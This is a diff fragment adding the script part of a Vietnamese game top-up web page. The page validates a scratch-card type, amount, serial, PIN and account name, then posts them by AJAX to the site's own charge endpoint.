+                    type: "POST",
+                    url: "/api/charge",
+                    contentType: "application/json",
+                    dataType: "json",
+                    data: JSON.stringify({
+                        type: type,
+                        amount: amount,
+                        serial: serial,
+                        pin: pin,
+                        username: username,
+                        typeGame: typeGame,
+                        typeLogin: typeLogin
+                    }),
+                    success: function(data) {
+                        console.log("Response:", data);
+                        if (data.status) {
+                            document.querySelector("#form_recharge").reset();
+                            elementSuccess.innerText = data.message;
+                            elementError.innerText = "";
+                            document.querySelectorAll('.recharge-amount__item').forEach(el => el.classList.remove(
+                                'active'));
+                        } else {
+                            elementSuccess.innerText = "";
+                            elementError.innerText = data.message;
+                        }
+                    },
+                    error: function(xhr, status, error) {
+                        console.log("Ajax error:", xhr, status, error);
+                        elementSuccess.innerText = "";
+                        elementError.innerText = "❌ Lỗi kết nối máy chủ. Vui lòng thử lại!";
+                    },
+                    complete: function() {
+                        $('[class="recharge-form__button"]')[0].disabled = false;
+                        recharge.showLoading(false);
+                    }
+                });
+            },
+            showLoading: function(isShow) {
+                const bodyForm = document.querySelector("#bodyForm");
+                const loading = document.querySelector("#loading");
+                if (isShow) {
+                    bodyForm.classList.add("hidden");
+                    loading.classList.add("active");
+                } else {
+                    bodyForm.classList.remove("hidden");
+                    loading.classList.remove("active");
+                }
+            },
+        };
+
+        // ===== VALIDATION =====
+        var validationForm = {
+            checkHasError: function() {
+                var type = recharge.getTypeChecked();
+                var amount = recharge.getAmountChecked();
+                var serial = $("#serial").val();
+                var pin = $("#pin").val();
+                var username = $("#username").val();
+                var accountType = document.querySelector("#account_type");
+                var isAccept = helpers.getLabelAndPlaceholderByGame(accountType.value);
+
+                if (!isAccept) {
+                    return "Cách đăng nhập này đang bảo trì, vui lòng thử cách khác";
+                }
+                if (validationForm.checkIsEmpty(type)) {
+                    return "Vui lòng chọn loại thẻ";
+                }
+                if (!validationForm.checkTypeValid(type)) {
+                    return "Loại thẻ không hợp lệ, vui lòng tải lại trang";
+                }
+                if (validationForm.checkIsEmpty(amount)) {
+                    return "Vui lòng chọn mệnh giá thẻ cào";
+                }
+                if (!validationForm.checkAmountValid(amount)) {
+                    return "Mệnh giá thẻ cào không hợp lệ, vui lòng tải lại trang";
+                }
+                if (validationForm.checkIsEmpty(serial)) {
+                    return "Vui lòng nhập số serial";
+                }
+                if (validationForm.checkIsEmpty(pin)) {
+                    return "Vui lòng nhập mã thẻ cào";
+                }
+                const [labelUsername] = helpers.getLabelAndPlaceholderByGame(accountType.value);
+                if (validationForm.checkIsEmpty(username)) {
+                    return `Vui lòng nhập ${labelUsername.toLowerCase()}`;
+                }
+                return null;
+            },
+            checkIsEmpty: function(text) {
+                return !text ? true : false;
+            },
+            checkAmountValid: function(amount) {
+                const amountAccept = [10000, 20000, 30000, 50000, 100000, 200000, 500000, 1000000];
+                return amountAccept.includes(parseInt(amount)) ? true : false;
+            },
+            checkTypeValid: function(type) {
+                const typeAccept = ["VIETTEL", "VINAPHONE", "MOBIFONE", "ZING", "GARENA", "GATE", "VIETNAMOBILE"];
+                return typeAccept.includes(type.toUpperCase()) ? true : false;
+            },
+        };
+
+        // ===== HELPERS =====
+        var helpers = {
+            camelize: function(str) {
+                return str.replace(/(?:^\w|[A-Z]|\b\w)/g, function(word, index) {
+                    return index === 0 ? word.toUpperCase() : word.toLowerCase();
+                }).replace(/\s+/g, "");
+            },
+            getGame: function() {
+                const urlGame = location.pathname;
+                const games = {
+                    "/app/10010/buy/0": ["nap_so", "Nạp Sò"],
+                    "/app/10020/buy/0": ["fifa_online4", "FIFA Online 4 (VN)"],
+                    "/app/10030/buy/0": ["fifa_online4m", "FIFA Online 4 M VN"],
+                    "/app/10040/buy/0": ["builda", "Builda"],
+                    "/app/10050/buy/0": ["free_fire", "Free Fire"],
+                    "/app/10060/buy/0": ["cai_the_tranh_hung", "Cái Thế Tranh Hùng"],
+                    "/app/10070/buy/0": ["blade_and_soul", "Blade and Soul"],
+                };
+                return games[urlGame] ? games[urlGame] : undefined;
+            },
+            getLabelAndPlaceholderByGame: function(type) {
+                const game = helpers.getGame();
+                const [, nameGame] = game;
+                const types = {
+                    hlv: ["Tên HLV", `Vui lòng nhập tên HLV ${nameGame}`],
+                    garena: ["Tên đăng nhập Gmail", `Vui lòng nhập email đăng nhập Gmail`],
+                    facebook: ["Tài khoản TikTok", `Vui lòng nhập tên đăng nhập TikTok`],
+                    uid: ["UID Tài khoản", `Vui lòng nhập UID tài khoản ${nameGame}`],
+                    id_apple: ["ID Apple", `Vui lòng nhập ID Apple`],
+                    vk: ["Tài khoản VK", `Vui lòng nhập email hoặc số điện thoại đăng nhập VK`],
+                    google: ["Tài khoản Google", `Vui lòng nhập email đăng nhập Google`],
+                    twitter: ["Tài khoản Twitter", `Vui lòng nhập email, số điện thoại hoặc tên người dùng đăng nhập Twitter`],
+                };
+                return types[type];
+            },
+        };
+
+        // ===== INIT =====
+        $(document).ready(function() {
+            recharge.registerControl();
+        });
+    </script>
+
+</body>
+
+</html>
